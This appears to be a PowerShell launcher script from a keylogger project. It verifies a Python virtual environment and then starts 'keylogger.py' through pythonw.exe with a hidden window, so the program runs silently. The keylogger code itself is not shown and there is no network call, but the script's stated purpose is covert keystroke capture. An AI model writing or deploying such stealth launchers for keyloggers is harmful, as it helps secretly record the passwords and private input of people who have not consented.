$ErrorActionPreference = "Stop"

try {
    # Check if the virtual environment exists
    if (-Not (Test-Path ".\.venv")) {
        Write-Host "[-] Virtual environment not found. Please run 'setup.ps1' first." -ForegroundColor Red
        exit 1
    }

    $pythonw = ".\.venv\Scripts\pythonw.exe"

    if (-Not (Test-Path $pythonw)) {
        Write-Host "[-] pythonw.exe not found in virtual environment." -ForegroundColor Red
        exit 1
    }

    # Activate the virtual environment
    Write-Host "[*] Activating virtual environment..." -ForegroundColor Cyan
    & .\.venv\Scripts\Activate.ps1

    # Run the main application without generating .pyc files
    Write-Host "[*] Running 'keylogger.py' silently..." -ForegroundColor Cyan
    Start-Process $pythonw -ArgumentList "-B", ".\keylogger.py" -WindowStyle Hidden
    
    Write-Host "[+] Execution completed successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
